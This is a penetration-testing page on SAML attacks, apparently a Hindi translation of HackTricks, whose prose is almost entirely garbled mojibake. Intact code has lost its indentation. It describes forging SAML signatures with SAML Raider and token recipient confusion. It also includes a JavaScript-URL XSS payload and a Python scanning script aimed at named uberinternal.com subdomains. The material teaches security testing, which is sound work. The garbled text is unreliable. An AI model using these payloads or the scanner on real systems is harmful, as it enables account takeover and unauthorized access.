рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреЛ рд╣рдЯрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рдЕрдиреБрд░реЛрдз рдХреЛ рд▓рдХреНрд╖реНрдп рдХреА рдУрд░ рдмрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВред рдпрджрд┐ Signature рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ

## Certificate Faking <a href="#certificate-faking" id="certificate-faking"></a>

## Certificate Faking

Certificate Faking рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ рдпрд╣ рдкрд░реАрдХреНрд╖рдг рдХрд░рддреА рд╣реИ рдХрд┐ **Service Provider (SP) рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ SAML Message рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп Identity Provider (IdP) рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣реИ**ред рдЗрд╕рдореЗрдВ SAML Response рдпрд╛ Assertion рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП \***self-signed certificate** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬреЛ SP рдФрд░ IdP рдХреЗ рдмреАрдЪ рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╕рддреНрдпрд╛рдкрди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред

### How to Conduct Certificate Faking

[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burp рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдг рд╣реИрдВ:

1. SAML Response рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░реЗрдВред
2. рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдПрдХ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╣реИ, рддреЛ `Send Certificate to SAML Raider Certs` рдмрдЯрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ SAML Raider Certs рдкрд░ рднреЗрдЬреЗрдВред
3. SAML Raider Certificates рдЯреИрдм рдореЗрдВ, рдЖрдпрд╛рддрд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ рдПрдХ self-signed рдХреНрд▓реЛрди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП `Save and Self-Sign` рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
4. Burp рдХреЗ Proxy рдореЗрдВ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд┐рдП рдЧрдП рдЕрдиреБрд░реЛрдз рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛рдПрдВред XML Signature рдбреНрд░реЙрдкрдбрд╛рдЙрди рд╕реЗ рдирдпрд╛ self-signed рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЪреБрдиреЗрдВред
5. `Remove Signatures` рдмрдЯрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдореМрдЬреВрджрд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреЛ рд╣рдЯрд╛ рджреЗрдВред
6. **`(Re-)Sign Message`** рдпрд╛ **`(Re-)Sign Assertion`** рдмрдЯрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рд╕рдВрджреЗрд╢ рдпрд╛ assertion рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░реЗрдВ, рдЬреИрд╕рд╛ рдХрд┐ рдЙрдкрдпреБрдХреНрдд рд╣реЛред
7. рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╕рдВрджреЗрд╢ рдХреЛ рдЖрдЧреЗ рдмрдврд╝рд╛рдПрдВред рд╕рдлрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпрд╣ рд╕рдВрдХреЗрдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ SP рдЖрдкрдХреЗ self-signed рдкреНрд░рдорд╛рдгрдкрддреНрд░ рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ SAML рд╕рдВрджреЗрд╢реЛрдВ рдХреЗ рд╕рддреНрдпрд╛рдкрди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИред

## Token Recipient Confusion / Service Provider Target Confusion <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Token Recipient Confusion рдФрд░ Service Provider Target Confusion рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдХрд┐ **Service Provider рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЗрдЪреНрдЫрд┐рдд рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ**ред рдореВрд▓ рд░реВрдк рд╕реЗ, рдПрдХ Service Provider рдХреЛ рдПрдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдпрджрд┐ рдпрд╣ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреНрд░рджрд╛рддрд╛ рдХреЗ рд▓рд┐рдП рдереАред рдпрд╣рд╛рдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рддрддреНрд╡ **Recipient** рдХреНрд╖реЗрддреНрд░ рд╣реИ, рдЬреЛ SAML Response рдХреЗ **SubjectConfirmationData** рддрддреНрд╡ рдХреЗ рднреАрддрд░ рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдХреНрд╖реЗрддреНрд░ рдПрдХ URL рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ Assertion рдХреЛ рдХрд╣рд╛рдБ рднреЗрдЬрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрджрд┐ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдЗрдЪреНрдЫрд┐рдд Service Provider рд╕реЗ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ Assertion рдХреЛ рдЕрдорд╛рдиреНрдп рдорд╛рдирд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

#### **How It Works**

SAML Token Recipient Confusion (SAML-TRC) рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╢рд░реНрддреЗрдВ рдкреВрд░реА рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, Service Provider (рдЬрд┐рд╕реЗ SP-Legit рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ) рдкрд░ рдПрдХ рдорд╛рдиреНрдп рдЦрд╛рддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рджреВрд╕рд░реЗ, рд▓рдХреНрд╖рд┐рдд Service Provider (SP-Target) рдХреЛ рдЙрд╕реА Identity Provider рд╕реЗ рдЯреЛрдХрди рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ SP-Legit рдХреА рд╕реЗрд╡рд╛ рдХрд░рддрд╛ рд╣реИред

рдЗрди рд╢рд░реНрддреЛрдВ рдХреЗ рддрд╣рдд рд╣рдорд▓реЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реАрдзреА рд╣реИред SP-Legit рдХреЗ рд╕рд╛рде рд╕рд╛рдЭрд╛ Identity Provider рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдкреНрд░рд╛рдорд╛рдгрд┐рдХ рд╕рддреНрд░ рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред Identity Provider рд╕реЗ SP-Legit рдХреЗ рд▓рд┐рдП SAML Response рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд┐рдП рдЧрдП SAML Response рдХреЛ, рдЬреЛ рдореВрд▓ рд░реВрдк рд╕реЗ SP-Legit рдХреЗ рд▓рд┐рдП рдерд╛, SP-Target рдХреА рдУрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рд╣рдорд▓реЗ рдореЗрдВ рд╕рдлрд▓рддрд╛ рдХреЛ SP-Target рджреНрд╡рд╛рд░рд╛ Assertion рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рд╕реЗ рдорд╛рдкрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ SP-Legit рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд╕рдорд╛рди рдЦрд╛рддрд╛ рдирд╛рдо рдХреЗ рддрд╣рдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## Logout рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдореЗрдВ XSS

рдореВрд▓ рд╢реЛрдз [рдЗрд╕ рд▓рд┐рдВрдХ](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣реБрдБрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕рд┐рдВрдЧ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди, рдПрдХ рд▓реЙрдЧрдЖрдЙрдЯ рдкреГрд╖реНрда рдЦреЛрдЬрд╛ рдЧрдпрд╛:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
рдЗрд╕ рд▓рд┐рдВрдХ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдкрд░, рдПрдХ рд░реАрдбрд╛рдпрд░реЗрдХреНрд╢рди рд╣реБрдЖ:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ `base` рдкреИрд░рд╛рдореАрдЯрд░ рдПрдХ URL рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИред рдЗрд╕реЗ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрддреЗ рд╣реБрдП, рд╡рд┐рдЪрд╛рд░ рдЖрдпрд╛ рдХрд┐ URL рдХреЛ `javascript:alert(123);` рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП рддрд╛рдХрд┐ XSS (Cross-Site Scripting) рд╣рдорд▓реЗ рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

### рд╕рд╛рдореВрд╣рд┐рдХ рд╢реЛрд╖рдг

[рдЗрд╕ рд╢реЛрдз рд╕реЗ](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ `uberinternal.com` рдХреЗ рдЙрдкрдбреЛрдореЗрди рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬреЛ рд╕рдорд╛рди рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдмрд╛рдж, `oidauth/prompt` рдкреГрд╖реНрда рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╡рд┐рдХрд╕рд┐рдд рдХреА рдЧрдИред рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдбреЗрдЯрд╛ рдЗрдирдкреБрдЯ рдХрд░рдХреЗ рдФрд░ рдпрд╣ рдЬрд╛рдВрдЪрдХрд░ XSS (Cross-Site Scripting) рдХреЗ рд▓рд┐рдП рдкрд░реАрдХреНрд╖рдг рдХрд░рддреА рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рдкрд░рд┐рд▓рдХреНрд╖рд┐рдд рд╣реЛрддрд╛ рд╣реИред рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдЗрдирдкреБрдЯ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдкрд░рд┐рд▓рдХреНрд╖рд┐рдд рд╣реЛрддрд╛ рд╣реИ, рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреГрд╖реНрда рдХреЛ рдХрдордЬреЛрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд┐рд╣реНрдирд┐рдд рдХрд░рддреА рд╣реИред
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## рд╕рдВрджрд░реНрдн

* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рд╣рдореЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред 

</details>
{% endhint %}
